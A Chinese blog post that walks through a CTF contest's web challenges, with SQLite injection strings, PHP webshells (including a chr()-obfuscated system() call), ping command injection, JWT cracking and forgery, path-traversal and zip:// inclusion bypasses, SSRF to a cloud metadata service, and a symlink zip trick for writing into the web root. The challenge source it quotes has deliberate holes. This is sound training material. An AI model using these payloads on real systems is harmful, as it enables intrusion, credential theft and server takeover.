---
title: PolarCTF2026春季个人挑战赛 web复现
date: 2026-03-24
category: wp
tags: ["web", "ctf", "wp"]
excerpt: 难度不算大但是学到很多
---

# PolarCTF2026春季个人挑战赛 web复现

比赛当天9点开赛，当时还在上程序设计，但是靶机一直没打开，中午试了下还是不行...一觉睡到五点起来才摸了两题，靶机还一直掉（哭，想好好打一把的说

## sql_search

之前打的都是MYSQL，SQLite之前没学习过，先来简单学习一下https://xz.aliyun.com/news/8220

注入`1`没回显，说明库中不存在该内容，同样的`1'` `1' --`也无回显

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar1.png)

```
1' or 1=1 --`给予一个恒真条件就能正常回显，确定闭合符号为`'
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar2.png)

尝试`order by` 探测字段数，总是无回显

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar3.png)

使用`UNION SELECT`探测字段，注入`1' union select 'A','B','C' --`回显结果如下，确定字段数为3，能利用第二第三列回显内容

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar4.png)

- `sql`是SQLite内置系统表 `sqlite_master`的一个字段，它存储了创建该表（或索引、视图等）时所用的完整 `CREATE`语句
- `sqlite_master`是SQLite 的系统表，记录所有数据库对象
- `%`在SQLite为通配符，`%flag%`会匹配所用带有flag的字符串

注入以下内容

```SQL
1' union select 'A',sql,'C' from sqlite_master where type='table' and name like '%flag%'--
```

实际上主要实现的是

```SQL
select sql from sqlite_master where type='table' and name like '%flag%'--
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar5.png)

更为稳妥的做法是直接爆表名

```SQL
1' union select 'A',sql,'C' from sqlite_master where type='table' --
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar6.png)

同时我们也看到了字段名为`flag`，直接进行数据查询

```SQL
1' union select 'A',flag,'C' from flaggggggggggg --
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar7.png)

## The Gift

题目源码

```PHP
<?php
include 'config.php';

highlight_file(__FILE__);
error_reporting(0);

class ConfigModel {
    public $apiKey = '';
    public $isAdmin = false; 
    public $requestTime = 0;

    public function __construct() {
        $this->requestTime = time();
        $this->apiKey = md5($_SERVER['REMOTE_ADDR'] . rand(1, 99999) . "S4ltY_String");
    }

    public function validateApiKey($inputKey) {
        if ($inputKey === $this->apiKey) {
            $this->isAdmin = true;
            return true;
        }
        return false;
    }
}

$config = new ConfigModel();

$requestData = array_merge($_GET, $_POST);
foreach ($requestData as $key => $value) {
    $$key = $value;
}

if (isset($user_api_key)) {
    $config->validateApiKey($user_api_key);
}

if (is_array($config) && isset($config['isAdmin']) && $config['isAdmin'] === 'true') {
    die("Success" . $FLAG);
} else {
    echo "<br>Access Denied.";
}
?>
```

使用`array_merge()`合并数组https://www.php.net/manual/zh/function.array-merge.php

要保证`$config['isAdmin'] === 'true'`，GET或POST传递：

```PHP
config[isAdmin]=true
```

实际上执行的代码为：

```PHP
//$_GET = ['config' => ['isAdmin' => 'true']]
//此时$key = 'config',$value = ['isAdmin' => 'true']
$config = ['isAdmin' => 'true'];
```

`$config`不再是`ConfigModel`对象，而是被覆盖为拥有`'isAdmin' => 'true'`键值对的数组

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar8.png)

## 并发上传

目录扫描 发现`/flag.php` `/upload.php` 和 `/upload` 目录

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar9.png)

根据题目推测攻击思路：

并发上传恶意马，通过访问/upload目录下的对应文件读取flag.php的内容

尝试直接读取`<?php echo file_get_contents('flag.php')?>` 无果

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar10.png)

尝试`<?php system('env')?>`读取到一个`fake flag`（艹

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar11.png)

自己建立后门

```PHP
<?php fwrite(fopen("shell.php","w"),'<?php @eval($_POST["cmd"])?>')?>
```

注意条件竞争时读取请求的并发数大于写入请求，执行成功蚁剑连`/upload/shell.php`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar12.png)

## 杰尼龟系统

执行ping命令`127.0.0.1 ;cat /flag.txt`，又拿到fake flag

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar13.png)

在当前目录下有`setup_flag.php`文件，`127.0.0.1 ; cat setup_flag.php`读取

```PHP
<?php
// 设置flag文件 - 运行一次即可
$flag_content = "CTF{JennyGu1_RCE_P1ng_1nj3ct10n_F1@9}";

// 创建随机目录和flag文件
$random_dir = bin2hex(random_bytes(8));
$flag_dir = "./" . $random_dir;
$flag_file = $flag_dir . "/flag_" . bin2hex(random_bytes(4)) . ".txt";

// 创建目录和文件
if (!is_dir($flag_dir)) {
    mkdir($flag_dir, 0777, true);
}

file_put_contents($flag_file, $flag_content);

// 创建一些干扰文件
for ($i = 0; $i < 10; $i++) {
    $fake_file = $flag_dir . "/fake_" . bin2hex(random_bytes(4)) . ".txt";
    file_put_contents($fake_file, "这不是flag，继续寻找吧！");
}

// 在其他目录也创建一些干扰文件
$other_dirs = ['logs', 'tmp', 'uploads', 'backup'];
foreach ($other_dirs as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    for ($j = 0; $j < 5; $j++) {
        $fake_flag = $dir . "/flag_" . bin2hex(random_bytes(3)) . ".txt";
        file_put_contents($fake_flag, "假的flag: FLAG{THIS_IS_NOT_THE_REAL_ONE}");
    }
}

echo "Flag文件已设置！<br>";
echo "Flag文件路径: " . $flag_file . "<br>";
echo "Flag内容: " . $flag_content . "<br>";
echo "请删除此文件以确保安全。";
?>
```

flag文件会创建在随机目录，并且会额外创建一些fake flag文件

`127.0.0.1 ; find / -name "flag*"`使用通配符查找根目录下所有以flag为开头的文件

最终找到了特殊路径`/var/tmp`临时目录

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar14.png)

## coke粉丝团

先注册一个用户，拿到Cookie

题目提示"粉丝灯牌一共有600个，每页显示10个，共有60页。其中只有一个10级灯牌藏在某个页面"

好久没写脚本了，比较简单自己动手写一下

```Python
import requests

url = 'http://9b143e90-03c9-4d38-ae2f-02fd78a31e34.www.polarctf.com:8090/shop.php?page='
data = '10.png'
Cookie = {
    'PHPSESSID':'u1fmq2u2ca0oef6qotqdljc30q',
    'jwt_token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNibiJ9.C6tQBldvuIUDA2qNhCMwNUomUFV8pvObDKTF4oi3erA'
}

def find():
    for i in range(1,61):
        text = requests.get(url + str(i),cookies=Cookie).text
        if data in text:
            print(f"灯牌在第{i}页")
            exit()
        else:print(f"灯牌不在第{i}页")

if __name__ == '__main__':
    find()
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar15.png)

访问第52页

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar16.png)

但是钻石不够先买其他灯牌然后抓包修改

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar17.png)

购买后访问`/coke.php`，题目提示**只有admin才能查看此页面！**

刚才在注册时注意到我们无法创建admin账户，同时Cookie中带有jwt，意图爆破jwt密钥

```PHP
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
```

hashcat一把嗦，爆破结果为`coke`，然后伪造admin的cookie

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar18.png)

修改jwt后再次访问`/coke.php`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar19.png)

## static

给了源码，分析一波

```PHP
<?php
    highlight_file(__FILE__);
    error_reporting(E_ALL);
    
    function hard_filter(&$file) {
        //ban掉了一些伪协议 '/' '\' 和'%00'截断
        $ban_extend = array("php://", "zip://", "data://", "%2f", "%00", "\\");
        foreach ($ban_extend as $ban) {
            if (stristr($file, $ban)) {
                return false;
            }
        }

        //ban掉一些命令执行函数，和'../'防止目录遍历
        $ban_keywords = array("eval", "system", "exec", "passthru", "shell_exec", "assert", "../");
        foreach ($ban_keywords as $keyword) {
            //匹配到一个$keyword会直接跳出循环
            if (stristr($file, $keyword)) {
                $count = 0;
                $file = str_replace($keyword, "", $file, $count); 
                break;
            }
        }
        
        //删除$file末尾的'/'
        $file = rtrim($file, '/');
        //只允许static/目录下的文件
        if (strpos($file, "static/") !== 0) {
            return false;
        }
        return true;
    }
    
    //路径拼接
    $file = $_GET['file'] ?? '';
    if (!hard_filter($file)) {
        die("Illegal request!");
    }
    
    $real_file = $file . ".php";
    $real_path = realpath($real_file) ?: $real_file;
    
    echo "<br>=== 调试信息 ===<br>";
    echo "1. 原始输入: " . htmlspecialchars($_GET['file'] ?? '') . "<br>";
    echo "2. 过滤后file: " . htmlspecialchars($file) . "<br>";
    echo "3. 拼接后的路径: " . htmlspecialchars($real_file) . "<br>";
    echo "4. 真实解析路径: " . htmlspecialchars($real_path) . "<br>";
    echo "5. 文件是否存在: " . (file_exists($real_path) ? "是" : "否") . "<br>";
    
    //文件包含
    if (file_exists($real_path)) {
        echo "6. 正在包含文件...<br>";
        ob_start();
        include($real_path);
        $content = ob_get_clean();
        echo "7. 文件内容: " . htmlspecialchars($content) . "<br>";
    } else {
        echo "6. 错误：文件不存在！<br>";
    }
?>
```

不能用伪协议，且包含文件名只能以static开头，但是

```PHP
$ban_keywords = array("eval", "system", "exec", "passthru", "shell_exec", "assert", "../");
foreach ($ban_keywords as $keyword) {
            if (stristr($file, $keyword)) {
                $count = 0;
                $file = str_replace($keyword, "", $file, $count); 
                break;
            }
        }
```

出现敏感字符时并没有返回false，而是进行了空字符的替换，`/`字符也没ban掉，这也给我们双写绕过的机会

GET传递`file=static/....//flag`

经过替换和凭借后真实的路径为`static/../flag.php`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar20.png)

## Signed_Too_Weak

默认账号密码登录进去没东西，目录扫描出`/templates`，告知flag需要管理员权限

发现登陆后的请求携带jwt，尝试爆破密钥为`polar`，伪造jwt的username字段为admin即可

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar21.png)

## Pandora Box

文件上传，题目提示**"所有文件最终将被强制视为 PHP脚本"**

我直接把之前构造好的带恶意字节码的图片上传了，访问对应路径，修改后缀但是都没拿到后门

发现原来提供了跳转链接，给出两条报错

```PHP
[System Error Log]:

Warning: include(upload/d1de80f58fe9d0ad211a82a87f6573be.jpg.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 69

Warning: include(): Failed opening 'upload/d1de80f58fe9d0ad211a82a87f6573be.jpg.php' for inclusion (include_path='.:/usr/share/php7') in /var/www/html/index.php on line 69
```

- 后端会使用include包含目标文件内容
- 目标文件名就是我们上传的文件拼接了.php后缀，虽然会把该名称的文件当成php文件执行，但是没能找到对应的文件内容（后端保存的文件仍是jpg

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar22.png)

我们先创建一个shell.php，写入一句话木马后压缩为zip，再更改后缀为.jpg绕过后缀名检查

然后利用zip伪协议

```HTML
http://623ef9f5-95c9-4290-b77f-e3ed5f3c33ec.www.polarctf.com:8090/?file=zip://upload/3a461f2f6ea1223ae229c2a69603d99a.jpg%23shell
```

后端会给我们访问的路径加上.php后缀

所以实际上我们访问的是`?file=zip://upload/3a461f2f6ea1223ae229c2a69603d99a.jpg%23shell.php`

这样就完成了包含shell.php文件，蚁剑连接

## 云中来信

题目要求输入目标URL进行代理访问，但是只允许访问`http://preview.polar`开头的内容

使用@进行绕过打SSRF

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar23.png)

输入`http://preview.polar``@127.0.0.1`返回当前页面的源码

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar24.png)

根据题目猜测考察内容可能为云元数据攻击OWASP

https://zhuanlan.zhihu.com/p/677029525

`/latest/meta-data` 是 云平台（特别是 AWS EC2）实例元数据服务（Instance Metadata Service, IMDS） 的一个标准端点路径，用于从运行中的云服务器内部安全地查询该实例的配置和身份信息

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar25.png)

访问`http://preview.polar``@127.0.0.1:80/latest/meta-data`，在UNICTF CloudDiag中也考察了该路径

回显内容为"需要有效的元数据令牌。请先访问 `/latest/api/token` 获取token，并在请求头 X-IMDS-Token 中携带"

访问`http://preview.polar``@127.0.0.1:80/latest/api/token`拿到token，使用高级选项带上请求头 `X-IMDS-Token`，再次访问`http://preview.polar``@127.0.0.1:80/latest/meta-data`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar26.png)

又回显了一个路由，对应访问`http://preview.polar``@127.0.0.1:80/latest/meta-data/ctf/22b9fdd7fb8b4fc90609`即可

## 新年贺卡

源码如下

```PHP
<?php
require_once 'config.php';
require_once 'lib/CardGenerator.php';
require_once 'lib/TemplateManager.php';

if (!isset($_SESSION['user'])) {
    $_SESSION['user'] = bin2hex(random_bytes(16));
}

$action = $_GET['action'] ?? 'home';
$generator = new CardGenerator();

try {
    switch ($action) {
        case 'generate':
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $template = $_POST['template'] ?? 'default';
                $message = $_POST['message'] ?? '';
                

                if (!TemplateManager::isValidTemplate($template)) {
                    throw new Exception("无效的模板选择");
                }
                

                $cardData = $generator->generateCard($template, $message);
                $cardPath = $generator->saveCard($cardData);
                

                echo "<h1>您的新年贺卡已生成！</h1>";
                echo "<img src='$cardPath' alt='新年贺卡' style='max-width: 500px;'>";
                echo "<p><a href='?action=download&file=" . basename($cardPath) . "'>下载贺卡</a></p>";
            }
            break;
            
        case 'download':
            $file = $_GET['file'] ?? '';
            $filePath = UPLOAD_DIR . basename($file);
            

            if (empty($file) || !is_file($filePath) || strpos($file, '../') !== false) {
                throw new Exception("无效的文件请求");
            }
            

            header('Content-Type: image/png');
            header('Content-Disposition: attachment; filename="newyear_card.png"');
            readfile($filePath);
            exit;
            
        case 'admin':

            if (isset($_GET['debug'])) {
                $debug = $_GET['debug'];
                

                if ($debug === 'show_templates') {
                    echo "<h1>模板列表</h1>";
                    $templates = TemplateManager::getAvailableTemplates();
                    echo "<pre>";
                    print_r($templates);
                    echo "</pre>";
                    

                    echo "<h2>模板目录文件:</h2>";
                    echo "<pre>";
                    print_r(scandir(TEMPLATE_DIR));
                    echo "</pre>";
                }
                

                else if ($debug === 'add_template' && $_SERVER['REQUEST_METHOD'] === 'POST') {
                    $name = $_POST['template_name'] ?? '';
                    $content = $_POST['template_content'] ?? '';
                    
                    try {
                        TemplateManager::addTemplate($name, $content);
                        echo "<p style='color: green;'>模板 '$name' 添加成功！</p>";
                        

                        $filePath = TEMPLATE_DIR . $name . '.php';
                        if (file_exists($filePath)) {
                            echo "<p>文件路径: " . $filePath . "</p>";
                            echo "<p>文件权限: " . substr(sprintf('%o', fileperms($filePath)), -4) . "</p>";
                        }
                    } catch (Exception $e) {
                        echo "<p style='color: red;'>错误: " . $e->getMessage() . "</p>";
                    }
                }
                

                else if ($debug === '/** **/_form') {
                    echo "<h1>添加新模板</h1>";
                    echo "<form method='post' action='?action=admin&debug=add_template'>";
                    echo "<p>模板名: <input type='text' name='template_name' pattern='[a-z0-9_]+' required></p>";
                    echo "<p>模板内容:<br><textarea name='template_content' rows='10' cols='50' required></textarea></p>";
                    echo "<p><input type='submit' value='添加模板'></p>";
                    echo "</form>";
                }
                

                else if ($debug === 'view_template') {
                    $name = $_GET['name'] ?? '';
                    $path = TEMPLATE_DIR . $name . '.php';
                    if (file_exists($path)) {
                        echo "<h1>模板内容: $name</h1>";
                        echo "<pre>" . htmlspecialchars(file_get_contents($path)) . "</pre>";
                    } else {
                        echo "<p>模板不存在</p>";
                    }
                }
            } else {
                echo "<h1>模板管理</h1>";
                echo "<ul>";
                echo "<li><a href='?action=admin&debug=show_templates'>查看模板列表</a></li>";
                echo "<li><a href='?action=admin&debug=/** **/_form'>添加模板</a></li>";
                echo "</ul>";
            }
            break;
            
        case 'home':
        default:
            // 显示主页
            $templates = TemplateManager::getAvailableTemplates();
            ?>
            <!DOCTYPE html>
            <html>
            <head>
                <title>新年贺卡生成器</title>
                <meta charset="UTF-8">
                <style>
                    body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
                    .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { color: #d32f2f; text-align: center; }
                    textarea { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                    select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                    button { width: 100%; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🎉 新年贺卡生成器 🎉</h1>
                    <form action="?action=generate" method="post">
                        <div>
                            <label for="message">祝福语:</label><br>
                            <textarea id="message" name="message" rows="4" required>新年快乐，万事如意！</textarea>
                        </div>
                        <div>
                            <label for="template">选择模板:</label><br>
                            <select id="template" name="template" required>
                                <?php foreach ($templates as $tpl): ?>
                                    <option value="<?php echo $tpl; ?>"><?php echo ucfirst($tpl); ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                        <button type="submit">生成贺卡</button>
                    </form>
                </div>
            </body>
            </html>
            <?php
    }
} catch (Exception $e) {
    die("<h1>错误</h1><p>" . $e->getMessage() . "</p>");
}
?>
```

有表单提交逻辑,但是debug字段被删了

```PHP
else if ($debug === '/** **/_form') {
                    echo "<h1>添加新模板</h1>";
                    echo "<form method='post' action='?action=admin&debug=add_template'>";
                    echo "<p>模板名: <input type='text' name='template_name' pattern='[a-z0-9_]+' required></p>";
                    echo "<p>模板内容:<br><textarea name='template_content' rows='10' cols='50' required></textarea></p>";
                    echo "<p><input type='submit' value='添加模板'></p>";
                    echo "</form>";
                }
```

fuzz出debug字段为`add_form`，出现源码中对应表单样式，先随便写一个表单提交

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar27.png)

回到home界面，刚才写的表单已经成功提交成为新的模板

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar28.png)

对其进行下载，查看下载内容正是表单提交的`template_content`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar29.png)

dirsearch扫一下发现`/templates/`目录，推测为保存的文件路径，尝试写马上传

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar30.png)

访问成功，注意在`/add_form`路由下的文件名保存时会自动加上.php后缀

## GET

目录扫描发现`robot.txt`，内容为

**If it won't open, maybe try including each other and see.**

**如果它打不开，也许试着（让它们）互相包含一下看看**

先上传一句话木马，`.php`后缀名被过滤

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar31.png)

能采用双写绕过，但是其对内容也做了限制

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar32.png)

利用`chr()`绕过内容检测，马被成功写入且暴露了路径

```PHP
<?php
$func=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$cmd='';
$cmd_chars=[108, 115, 32, 47, 118, 97, 114, 47, 119, 119, 119, 47, 104, 116, 109, 108];
foreach($cmd_chars as $ascii){
    $cmd.=chr($ascii);
}
@$func($cmd);
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar33.png)

在`/var/www/html`目录下有两个可疑的php文件，一个访问的时候没有权限，一个空白

想起`robot.txt`和标题的提示，我们看一下打开空白的php文件的内容

```PHP
<?php
$file = $_GET['file'];
include $file;
```

预期解应该是使用get传递file字段完成对另一个文件的包含

emm......但是我在开发者工具直接抓到了响应内容......

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar34.png)

## 狗黑子最后的起舞

什么东西都没有，目录扫描发现`/flag.php` `/login.php` `/register.php`

`/register.php`注册账号后登录，发现新的路由`/ghzpolar`，再次进行目录扫描，发现`.git/`目录

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar35.png)

`.git`源码泄露，用GitHack拿源码

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/Polar/Polar36.png)

拿到`gouheizi.php`文件

```PHP
<?php

if (isset($_FILES['file'])) {
    $f = $_FILES['file'];
    if ($f['error'] === UPLOAD_ERR_OK) {
        $dest = '/etc/' . time() . '_' . basename($f['name']);
        if (move_uploaded_file($f['tmp_name'], $dest)) {
            $escapedDest = escapeshellarg($dest);
           exec("unzip -o $escapedDest -d /etc/ 2>&1");
            if ($code !== 0) {
             exec("unzip -o $escapedDest -d /etc/ 2>&1");
            }
            unlink($dest);
            echo "ghz";
        }
    }
}
```

向该路由上传文件到`/etc`录后解压并执行，然后删除文件再输出ghz

攻击思路是上传一个指向`/var/www/html`的软连接压缩包，从而绕过路径限制实现解压路径污染

再把一句话木马放入与压缩包同名的文件夹中，压缩后上传，此时就能把木马文件写入`/var/www/html`目录下

```Bash
//创建软链接
ln -s /var/www/html link
//压缩为1.zip
zip -y 1.zip link
```

注意一句话木马所在的文件夹要与软链接同名，在我的例子中就应该为link文件夹

这样在解压该文件夹的压缩包时就能触发`/etc/l ink`的软链接实现在`/var/www/html`写马

蚁剑连接，flag在`/flag.txt`
